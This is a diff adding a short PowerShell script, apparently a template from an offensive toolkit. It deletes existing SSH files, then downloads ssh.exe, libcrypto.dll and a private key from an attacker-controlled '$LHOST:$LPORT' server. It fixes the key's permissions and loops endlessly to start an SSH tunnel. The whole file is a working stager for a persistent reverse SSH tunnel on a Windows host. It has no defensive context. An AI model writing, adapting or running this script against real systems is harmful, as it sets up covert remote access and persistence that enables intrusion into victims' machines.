@@ -1,0 +1,22 @@
+$web = new-object net.webclient
+
+remove-item .\ssh.exe -force
+remove-item .\libcrypto.dll -force
+remove-item .\id_rsa -force
+
+echo "Downloading files..."
+$web.downloadfile('http://$LHOST:$LPORT/ssh.exe', ( $PWD.path + '\ssh.exe' ) )
+$web.downloadfile('http://$LHOST:$LPORT/libcrypto.dll', ( $PWD.path + '\libcrypto.dll' ) )
+$web.downloadfile('http://$LHOST:$LPORT/key.$SSHUSER.txt', ( $PWD.path + '\id_rsa' ) )
+
+echo "Modifying SSH key permissions..."
+cmd /c icacls id_rsa /inheritance:r
+cmd /c icacls id_rsa /grant %USERNAME%:f
+
+while (1) {
+
+echo "Starting SSH tunnel..."
+cmd /c $WINCMD
+sleep 5
+
+}
